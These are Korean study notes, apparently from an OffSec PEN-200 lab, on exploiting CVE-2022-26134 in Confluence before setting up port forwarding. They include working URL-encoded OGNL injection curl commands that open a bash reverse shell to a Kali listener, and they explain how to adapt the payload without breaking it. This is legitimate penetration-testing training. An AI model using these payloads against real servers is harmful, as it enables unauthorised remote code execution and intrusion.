# 19.2.2 랩 환경 구성

> **Setting Up the Lab Environment** · PEN-200 §19.2.2

CONFLUENCE01 에 접근하려면 Confluence 웹 애플리케이션의 명령 실행 취약점으로 리버스셸을 얻어야 함. CVE-2022-26134 취약 판정 뒤 Rapid7 블로그에서 리버스셸을 반환한다는 PoC cURL 명령을 찾음.

```
curl -v
http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByNa
me%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash
%27%2C%27-c%27%2C%27bash%20-
i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

*Rapid7 블로그의 원본 PoC — 대상과 리버스셸 주소가 저자 환경 값으로 박혀 있음*

동작을 정확히 모르는 페이로드는 실행하지 않는 것이 원칙이므로 먼저 해독함. 요청은 `http://10.0.0.28:8090`(블로그 저자의 취약 Confluence 서버로 추정)으로 가고, URL 경로가 대부분 URL 인코딩돼 있어 디코딩이 필요함. Burp 의 Decoder 탭에서 `Decode As… > URL`, 또는 CyberChef 같은 온라인 도구로 빠르게 풀 수 있음. 실제 기업 환경의 민감 정보를 온라인 도구에 붙여넣는 것은 피해야 하지만, 여기서는 이미 공개된 PoC 라 무방함.

디코딩하면 경로의 정체가 드러남.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new
java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270
0>&1').start()")}/
```

OGNL 인젝션 페이로드임. OGNL(Object-Graph Notation Language)은 Java 애플리케이션에서 흔히 쓰는 표현식 언어이고, 사용자 입력이 OGNL 표현식 파서로 흘러가도록 처리되면 인젝션이 성립함. OGNL 표현식 안에서 Java 코드를 실행할 수 있어 그대로 임의 코드 실행이 됨. 이 페이로드는 Java 의 `ProcessBuilder` 클래스로 Bash 대화형 리버스셸(`bash -i`)을 띄움.

고칠 곳은 둘 — 대상 Confluence 서버 주소, 그리고 리버스셸이 향하는 주소·포트(원문은 `10.0.0.28` 의 `1270`). 각각 우리 대상인 `192.168.50.63` 과 Kali 리스너 `/dev/tcp/192.168.118.4/4444` 로 바꾸고 curl 의 상세 출력 플래그도 뺌.

⚠️ **함정 — 수정한 페이로드 전체를 다시 URL 인코딩하면 안 됨.** PoC 문자열은 완전히 인코딩된 것이 아니고 `.`·`-`·`/` 는 인코딩되지 않은 채 남아 있는데, 항상 그런 것은 아니지만 이 익스플로잇에서는 그것이 동작에 중요함. 이 문자들이 인코딩되면 서버가 URL 을 다르게 파싱해 페이로드가 실행되지 않을 수 있음. 그래서 원본 PoC 를 바탕으로 필요한 파라미터만 손으로 고침.

```
curl
http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
bash%27%2C%27-c%27%2C%27bash%20-
i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

Kali 에서 `nc -nvlp 4444` 로 리스너를 띄우고 다른 셸에서 위 curl 을 실행함. curl 자체는 아무것도 반환하지 않지만 리스너에 셸이 잡히고, `id` 결과가 `uid=1001(confluence)` 로 권한이 상당히 제한된 계정임을 확인해 줌.

```

```

*CONFLUENCE01 인터페이스 둘 — `ens192` 가 WAN, `ens224` 가 내부망*

이어서 `ip route` 로 경로를 확인함.

```

ip route
default via 192.168.50.254 dev ens192 proto static
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

DB 서버 주소와 평문 사용자명·비밀번호를 얻었지만 여기서 막힘.

- CONFLUENCE01 에는 PostgreSQL 클라이언트가 없고, 저권한 `confluence` 사용자로 도는 중이라 설치도 쉽지 않음
- Kali 에는 `psql` 이 있지만 PGDATABASE01 은 CONFLUENCE01 에서만 라우팅되므로 직접 붙을 수 없음

다만 Kali 와 CONFLUENCE01 사이에는 방화벽이 없어, CONFLUENCE01 의 WAN 인터페이스에 포트를 바인딩하고 Kali 에서 거기 붙는 것을 막는 것이 아무것도 없음. 포트 포워딩이 정확히 이런 상황에서 쓰임 — CONFLUENCE01 의 WAN 인터페이스 포트에서 listen 하고, 받은 패킷을 내부 서브넷의 PGDATABASE01 로 전달함.
